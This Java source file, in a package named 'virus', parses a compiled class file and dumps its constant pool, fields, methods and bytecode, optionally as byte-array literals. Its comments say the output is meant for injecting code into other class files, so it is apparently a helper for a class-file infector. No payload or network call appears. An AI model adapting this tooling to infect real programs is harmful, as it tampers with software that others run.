package virus;

import java.util.Arrays;

import util.ByteArrayUtil;
import datastructs.AttributeInfo;
import datastructs.ClassFile;
import datastructs.Code;
import datastructs.ConstantEntry;
import datastructs.MethodInfo;

/**
 * Read a class file and extract all the stuff associated with and required by a given function.
 */
public class Main {
	public static void main(String args[]) throws Exception {
		final boolean OUTPUT = false;

		String path = args[0];
		String filename = args[1];
		final String INFILE = path + filename;
		System.out.println(INFILE);
		final String OUTFILE = path + "out." + filename;

		System.out.println("-----START");
		ClassFile cf = new ClassFile(INFILE);

		/*
		 * Remove <init>.
		 * We remove <init> because the injected class already has an <init> function that we must keep intact.
		 * Removing our <init> will likely cause issues if we're not careful with the injected code.
		 */
		//		{
		//			String target = "<init>";
		//			ConstantEntry constant_pool[] = cf.getConstant_pool();
		//			int triple[] = findConstantPoolMethod(target, cf.getRawdata(), constant_pool);
		//			if (triple != null) {
		//				for (int index : triple) {
		//					constant_pool[index] = null;
		//				}
		//			}
		//
		//			/*
		//			 * Remove methods[] entries that reference removed (null) constant_pool entries.
		//			 * (Since methods[] is stored in cf we _are_ modifying it; don't worry about scope)
		//			 */
		//			MethodInfo methods[] = cf.getMethods();
		//			for (int i = 0; i < methods.length; ++i) {
		//				if (constant_pool[methods[i].getDescriptor_index() - 1] == null) {
		//					methods[i] = null;
		//				}
		//				if (constant_pool[methods[i].getName_index() - 1] == null) {
		//					methods[i] = null;
		//				}
		//			}
		//		}

		/*
		 * Print out the bytes of the constant pool in array format.
		 * When we add them to the new class files we can just add the number of constant_pool entries
		 *  that are already in there.
		 */
		if (OUTPUT) {
			/*
			 * Output constant_pool table
			 */
			System.out.println("private final static byte ins_const_pool[][] = new byte[][] {");
			//System.out.println("constant_pool[] = {");
			{
				ConstantEntry constant_pool[] = cf.getConstant_pool();
				for (int i = 0; i < constant_pool.length; ++i) {
					/*
					 * Replace null with empty Utf8 entry (essentially a no-op)
					 */
					if (constant_pool[i] == null) {
						constant_pool[i] = new ConstantEntry("");
					}

					byte data[] = constant_pool[i].toBytes();
					System.out.print("{");
					for (int j = 0;;) {
						System.out.print(data[j]);
						++j;
						if (j >= data.length) {
							break;
						}
						System.out.print(",");
					}
					System.out.println("},");
				}
			}
			System.out.println("};");
			System.out.println("private final static byte ins_methods[][][] = new byte[][][] {");

			/*
			 * Output the fields[] table.
			 */
			System.out.println("{");
			//System.out.println("fields[] = {");
			{
				MethodInfo fields[] = cf.getFields();
				for (int i = 0; i < fields.length; ++i) {
					byte data[] = fields[i].toBytes();
					System.out.print("{");
					for (int j = 0;;) {
						System.out.print(data[j]);
						++j;
						if (j >= data.length) {
							break;
						}
						System.out.print(",");
					}
					System.out.println("},");
				}
			}
			System.out.println("}");

			/*
			 * Output the methods[] table.
			 */
			System.out.println(", {");
			//System.out.println("methods[] = {");
			{
				MethodInfo methods[] = cf.getMethods();
				for (int i = 0; i < methods.length; ++i) {
					/*
					 * Ignore removed methods[] entries.
					 * We don't need to replace them with no-ops (in theory).
					 */
					if (methods[i] == null) {
						continue;
					}
					byte data[] = methods[i].toBytes();
					System.out.print("{");
					for (int j = 0;;) {
						System.out.print(data[j]);
						++j;
						if (j >= data.length) {
							break;
						}
						System.out.print(",");
					}
					System.out.println("},");
				}
			}
			System.out.println("}");
			System.out.println("};");
		}

		//cf.writeFile(OUTFILE);
		System.out.println("-----END");

		/*
		 * Output methods[] to terminal.
		 */
		/*{
			MethodInfo methods[] = cf.getMethods();
			for (int i = 0; i < methods.length; ++i) {
				if (methods[i] != null) {
					System.out.println(methods[i].toString());
				}
			}
		}*/

		/*
		 * Print constant_pool.
		 */
		{
			ConstantEntry constant_pool[] = cf.getConstant_pool();
			for (int i = 0; i < constant_pool.length; ++i) {
				System.out.println("[" + i + "]" + constant_pool[i].toString(false, cf.getRawdata(), constant_pool));
			}
		}

		/*
		 * Output code attribute of a method to terminal.
		 */
		{
			ConstantEntry constant_pool[] = cf.getConstant_pool();
			MethodInfo methods[] = cf.getMethods();
			for (int i = 0; i < methods.length; ++i) {
				if (methods[i] == null) {
					continue;
				}
				AttributeInfo method_attributes[] = methods[i].getAttributes();
				//System.out.println("Num attributes = " + method_attributes.length);//TODO: deleteme
				for (int j = 0; j < method_attributes.length; ++j) {
					AttributeInfo method_attribute = method_attributes[j];
					ConstantEntry name_entry = constant_pool[method_attribute.getAttribute_name_index() - 1];
					if (name_entry.getType() == ConstantEntry.CONSTANT_Utf8) {
						String name = ConstantEntry.parseCONSTANT_Utf8(cf.getRawdata(), name_entry);
						if (name.equals("Code")) {
							System.out.println(Arrays.toString(method_attribute.getInfo()));//TODO: deleteme
							System.out.println("0 = " + method_attribute.getInfo().length);
							Code code = new Code(method_attribute.getInfo(), 0, method_attribute.getInfo().length);

							System.out.println(code.toString());

							System.out.println("CODE:");
							byte codebytes[] = code.getCode();
							System.out.println("length = " + codebytes.length);
							for (int k = 0; k < codebytes.length; k += 4) {
								System.out.println(Integer.toHexString(0x000000FF & codebytes[k]));
							}
						}
					}
				}
			}
		}

		{
			MethodInfo methods[] = cf.getFields();
			for (int i = 0; i < methods.length; ++i) {
				System.out.println("[" + i + "] access_flags = " + methods[i].getAccess_flags());
				System.out.println("[" + i + "] name_index = " + methods[i].getName_index());
				System.out.println("[" + i + "] descriptor_index = " + methods[i].getDescriptor_index());
				System.out.println("[" + i + "] attributes_count = " + methods[i].getAttributes_count());
				ConstantEntry name = cf.getConstant_pool()[methods[i].getName_index() - 1];
				System.out.println("name = " + ConstantEntry.parseCONSTANT_Utf8(cf.getRawdata(), name));
			}
		}

		/*{
			MethodInfo methods[] = cf.getMethods();
			for (int i = 0; i < methods.length; ++i) {
				System.out.println("[" + i + "] nameindex = " + methods[i].getName_index());
				ConstantEntry name = cf.getConstant_pool()[methods[i].getName_index() - 1];
				System.out.println("name = " + ConstantEntry.parseCONSTANT_Utf8(cf.getRawdata(), name));
			}
		}*/
		//printMethodNames(cf.getRawdata(), cf.getConstant_pool());
	}

	/**
	 * Search for a given function in the constant_pool and then return its indices if found.
	 * A method is in the constant_pool if it's called by code somewhere in the class (I think);
	 *  that seems to be the defining reason.
	 *  
	 *  The reason for this is that we want to figure out all the bits that reference a function so we can
	 *   then insert them ourselves.
	 *  The renamed function will need this constant_pool stuff (other than UTF8).
	 */
	private static int[] findConstantPoolMethod(String target, byte data[], ConstantEntry constant_pool[]) {
		for (int i = 0; i < constant_pool.length; ++i) {
			if (constant_pool[i].getType() == ConstantEntry.CONSTANT_Methodref) {
				//CONSTANT_Methodref_info -> CONSTANT_NameAndType_info
				int nextIndex1 = ByteArrayUtil.bytes2(data, constant_pool[i].getByteIndex() + (1 + 2));
				--nextIndex1;//Because arrays are 0 indexed but constant_pool isn't

				if (constant_pool[nextIndex1].getType() != ConstantEntry.CONSTANT_NameAndType) {
					throw new Error("1 != CONSTANT_NameAndType, = " + constant_pool[nextIndex1].getType());
				}

				//CONSTANT_NameAndType_info -> CONSTANT_Utf8_info
				int nextIndex2 = ByteArrayUtil.bytes2(data, constant_pool[nextIndex1].getByteIndex() + 1);
				--nextIndex2;//Because arrays are 0 indexed but constant_pool isn't

				if (constant_pool[nextIndex2].getType() != ConstantEntry.CONSTANT_Utf8) {
					throw new Error("2 != CONSTANT_Utf8, = " + constant_pool[nextIndex2].getType());
				}

				String name = ConstantEntry.parseCONSTANT_Utf8(data, constant_pool[nextIndex2]);
				//System.out.println(name);
				if (name.equals(target)) {
					return new int[] { i, nextIndex1, nextIndex2 };
				}
			}
		}
		return null;
	}

	/**
	 * Look through the constant_pool to find and print function names.
	 * Assumes proper formatting.
	 * @param data
	 * @param constant_pool
	 */
	private static void printMethodNames(byte data[], ConstantEntry constant_pool[]) {
		for (int i = 0; i < constant_pool.length; ++i) {
			if (constant_pool[i].getType() == ConstantEntry.CONSTANT_Methodref) {
				//CONSTANT_Methodref_info -> CONSTANT_NameAndType_info
				int nextIndex = ByteArrayUtil.bytes2(data, constant_pool[i].getByteIndex() + (1 + 2));
				--nextIndex;//Because arrays are 0 indexed but constant_pool isn't

				if (constant_pool[nextIndex].getType() != ConstantEntry.CONSTANT_NameAndType) {
					throw new Error("1 != CONSTANT_NameAndType, = " + constant_pool[nextIndex].getType());
				}

				//CONSTANT_NameAndType_info -> CONSTANT_Utf8_info
				nextIndex = ByteArrayUtil.bytes2(data, constant_pool[nextIndex].getByteIndex() + 1);
				--nextIndex;//Because arrays are 0 indexed but constant_pool isn't

				if (constant_pool[nextIndex].getType() != ConstantEntry.CONSTANT_Utf8) {
					throw new Error("2 != CONSTANT_Utf8, = " + constant_pool[nextIndex].getType());
				}

				String name = ConstantEntry.parseCONSTANT_Utf8(data, constant_pool[nextIndex]);
				System.out.println(name);
			}
		}
	}
}